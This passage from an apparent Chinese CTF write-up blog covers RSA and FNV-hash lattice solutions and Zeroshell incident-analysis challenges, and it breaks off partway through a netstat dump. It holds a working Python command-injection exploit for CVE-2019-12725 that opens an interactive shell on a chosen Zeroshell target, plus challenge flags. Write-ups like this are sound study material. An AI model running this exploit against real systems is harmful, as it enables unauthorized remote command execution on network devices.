class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>):<br>        k = (b+<span class="hljs-number">0x514</span>)*x1 - (a+<span class="hljs-number">0x114</span>)*x2<br>        <br>        <span class="hljs-keyword">if</span>(gcd(k,n) &gt;<span class="hljs-number">1</span> &amp; gcd(k,n)&lt;n-<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(gcd(k,n))<br>            q = gcd(k,n)<br><br>q = <span class="hljs-number">129713873839145334329392401371189963777712190897978816709235924556672196006347844671068464026219117804812297989197327919408459177096469030481019240080779880761097280806029355911233146512712582901895037850147815390703479188070631638892905175053709386715345561960074809966193484477155806599143328718289066817237</span><br>p = n//q<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(p*q ==n)<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(phi)<br>d = invert(e,phi)<br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><ul><li>第二部分<ul><li>分析得到：</li></ul></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">h = <span class="hljs-built_in">pow</span>(<span class="hljs-number">514</span>`*`<span class="hljs-selector-tag">p</span> - <span class="hljs-number">114</span>`*`<span class="hljs-selector-tag">q</span>, n - <span class="hljs-selector-tag">p</span> - <span class="hljs-selector-tag">q</span>, n) <br></code></pre></td></tr></table></figure><ul><li><p>由<code>pow(a,phi,n) = 1(a、n互素)</code>得<code>h = pow(514</code><em><code>p-114</code></em><code>q , -1 , n)</code></p></li><li><p>求逆元，求出<code>514</code><em><code>p-114</code></em><code>q</code>后联立<code>n = p *q</code> 即可</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    gcd, x1, y1 = extended_gcd(b % a, a)<br>    x = y1 - (b // a) * x1<br>    y = x1<br>    <span class="hljs-keyword">return</span> gcd, x, y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_inverse</span>(<span class="hljs-params">h, n</span>):<br>    gcd, a, _ = extended_gcd(h, n)<br>    <span class="hljs-keyword">if</span> gcd != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;h&#125;</span> 和 <span class="hljs-subst">&#123;n&#125;</span> 不是互质的，无法计算逆元。&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> a % n  <br><br><br>h =   <span class="hljs-comment"># 替换为实际的 h 值</span><br>n =   <span class="hljs-comment"># 替换为实际的 n 值</span><br><br><span class="hljs-keyword">try</span>:<br>    a = mod_inverse(h, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;满足 a * <span class="hljs-subst">&#123;h&#125;</span> ≡ 1 (mod <span class="hljs-subst">&#123;n&#125;</span>) 的 a 值为: <span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>n =   <span class="hljs-comment"># 替换为实际的 n 值</span><br>h =   <span class="hljs-comment"># 替换为实际的 h 值</span><br><br><span class="hljs-comment"># 定义符号 p 和 q</span><br>p, q = var(<span class="hljs-string">&#x27;p q&#x27;</span>)<br><br>eq1 = h == <span class="hljs-number">514</span> * p - <span class="hljs-number">114</span> * q<br>eq2 = n == p * q<br><br>solution = solve([eq1, eq2], p, q)<br><br>solution<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c = <br>n = <br>p = <br>q = <br>e = <span class="hljs-number">0x10001</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(phi)<br>d = invert(e,phi)<br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><ul><li>Flag:</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b50dd42-e130-<span class="hljs-number">4</span>aa1-af32-f0c228139ba9&#125;<br></code></pre></td></tr></table></figure><h3 id="Fffffhash"><a href="#Fffffhash" class="headerlink" title="Fffffhash"></a>Fffffhash</h3><ul><li>分析题目，一开始想构造格然后应用LLL求解，但一直没构造出来，然后写了个爆破的代码但要跑很久，最后搜索发现本题实际上是fnv算法的应用，去网上找了模板稍微改改，很快就写出来了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python">TARGET = <span class="hljs-number">201431453607244229943761366749810895688</span><br>h0 = <span class="hljs-number">0x6c62272e07bb014262b821756295c58d</span><br>p = <span class="hljs-number">0x0000000001000000000000000000013b</span><br>MOD = <span class="hljs-number">2</span>^<span class="hljs-number">128</span><br><br>n = <span class="hljs-number">16</span><br>M = Matrix.column([p^(n - i - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])<br>M = M.augment(identity_matrix(n+<span class="hljs-number">1</span>).stack(vector([<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>))))<br>Q = Matrix.diagonal([<span class="hljs-number">2</span>^<span class="hljs-number">256</span>] + [<span class="hljs-number">2</span>^<span class="hljs-number">4</span>] * n + [<span class="hljs-number">2</span>^<span class="hljs-number">8</span>])<br>M *= Q<br>M = M.BKZ()<br>M /= Q<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> M:<br>    <span class="hljs-keyword">if</span> r[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(r[-<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span>:<br>        r *= r[-<span class="hljs-number">1</span>]<br>        <span class="hljs-comment">#print(r)</span><br>        good = r[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(good)<br>        <span class="hljs-keyword">break</span><br><br>inp = []<br>y = <span class="hljs-built_in">int</span>(h0*p)<br>t = (h0*p^n + good[<span class="hljs-number">0</span>] * p^(n-<span class="hljs-number">1</span>)) % MOD<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        y_ = (<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p^(n-i-<span class="hljs-number">1</span>) % MOD<br>        <span class="hljs-keyword">if</span> y_ == t:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;good&#x27;</span>, i, x)<br>            inp.append(x)<br>            <span class="hljs-keyword">if</span> i &lt; n-<span class="hljs-number">1</span>:<br>                t = (t + good[i+<span class="hljs-number">1</span>] * p^(n-i-<span class="hljs-number">2</span>)) % MOD<br>                y = ((<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p) % MOD<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, i)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(inp).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#020101081b04390001051a020a3d0f0f</span><br></code></pre></td></tr></table></figure><ul><li>不断调整n的取值，在n为16、23、29等时可以得到正解</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826747.png" alt="img"></p><h2 id="威胁检测与恶意分析"><a href="#威胁检测与恶意分析" class="headerlink" title="威胁检测与恶意分析"></a>威胁检测与恶意分析</h2><h3 id="Zeroshell后期EXP已发布GitHub"><a href="#Zeroshell后期EXP已发布GitHub" class="headerlink" title="&#x3D;&#x3D;Zeroshell后期EXP已发布GitHub&#x3D;&#x3D;"></a>&#x3D;&#x3D;Zeroshell后期EXP已发布GitHub&#x3D;&#x3D;</h3><ul><li><p>代码地址：<a href="https://github.com/YZS17/CVE-2019-12725">CVE-2019-12725.py</a></p></li><li><p>运行效果：</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826011.png" alt="image-20241217224055072"></p></li></ul><h3 id="Zeroshell-1"><a href="#Zeroshell-1" class="headerlink" title="Zeroshell_1"></a>Zeroshell_1</h3><ul><li>流量包过滤<code>ip.dst==61.139.2.100&amp;&amp;http</code></li><li>发现流量包</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826939.png" alt="img"></p><p>进去发现一串字符</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826865.png" alt="img"></p><ul><li>一眼flag Base64结果，直接解密</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826035.png" alt="img"></p><h3 id="Zeroshell-2"><a href="#Zeroshell-2" class="headerlink" title="Zeroshell_2"></a>Zeroshell_2</h3><ul><li>不多说，上面那个包一眼被打了执行命令</li><li>吐槽自己一句，虚拟机卡了bug，卡了一两个小时，最后和队友换电脑一打就通，呜呜呜难受死了</li><li>CVE-2019-12725</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826506.png" alt="img"></p><ul><li>这发包累死了，后面交互这做不下去呀，得写个EXP交互shell</li><li>参照做强网杯第一道题exp结构</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>show = <span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">     _______    ________    ___   ____ _______       ______  ________   ______</span><br><span class="hljs-string">    / ____/ |  / / ____/   |__ \ / __ &lt;  / __ \     &lt;  /__ \/__  /__ \ / ____/</span><br><span class="hljs-string">   / /    | | / / __/________/ // / / / / /_/ /_____/ /__/ /  / /__/ //___ \</span><br><span class="hljs-string">  / /___  | |/ / /__/_____/ __// /_/ / /\__, /_____/ // __/  / // __/____/ /</span><br><span class="hljs-string">  \____/  |___/_____/    /____/\____/_//____/     /_//____/ /_//____/_____/</span><br><span class="hljs-string">                                                                                                    </span><br><span class="hljs-string">                                                   CVE-2019-12725 By XU17</span><br><span class="hljs-string">Usage Example:                                                            </span><br><span class="hljs-string">    Target ip&gt; http://192.168.1.1/</span><br><span class="hljs-string">    ——————————————————————————————————————————————————————————————————————————————————</span><br><span class="hljs-string">    powershell&gt; whoami</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(show + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>base_url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target ip&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;——————————————————————————————————————————————————————————————————————————————————&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;powershell&gt; &quot;</span>) <br><br>    <span class="hljs-keyword">if</span> cmd.lower() == <span class="hljs-string">&#x27;exit&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><br>    payload = <span class="hljs-string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A&#123;cmd&#125;%0A&#x27;&quot;</span><br>    encoded_cmd = quote(cmd)<br> <br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span><span class="hljs-subst">&#123;payload.replace(<span class="hljs-string">&#x27;&#123;cmd&#125;&#x27;</span>, encoded_cmd)&#125;</span>&quot;</span>  <br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br><br>        clean_text = re.sub(<span class="hljs-string">r&#x27;&lt;html&gt;.*?&lt;/html&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, response.text, flags=re.DOTALL)<br>        clean_text = re.sub(<span class="hljs-string">r&#x27;\n\s*\n&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, clean_text, flags=re.MULTILINE)<br>        half_text = clean_text[:<span class="hljs-built_in">int</span>((<span class="hljs-built_in">len</span>(clean_text)/<span class="hljs-number">2</span>))]<br>        <span class="hljs-built_in">print</span>(half_text)<br><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Request Error:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826918.png" alt="image-20241217223812585"></p><ul><li>俩flag一样的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;<br></code></pre></td></tr></table></figure><h3 id="Zeroshell-3"><a href="#Zeroshell-3" class="headerlink" title="Zeroshell_3"></a>Zeroshell_3</h3><ul><li>这木马应该不是一直触发，过段时间出一次</li><li>查看网络状态（得多试试，不一定抓到）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">netstat -a<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826214.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs Python">cmd&gt; netstat -a<br>Active Internet connections (servers <span class="hljs-keyword">and</span> established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:kerberos-adm          *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.254</span>:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:domain     *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.141</span><span class="hljs-number">.142</span>:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.locald:domain *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdoma:<span class="hljs-number">953</span> *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56914</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43085</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33171</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37965</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44065</span>      b2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37965</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34095</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44065</span>      b2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47235</span>      x.ns.se:domain          ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">38275</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46061</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56910</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40409</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59067</span>      c0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56920</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56587</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45133</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56918</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45523</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56912</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40015</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44243</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50969</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51223</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33225</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35605</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44243</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50969</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span 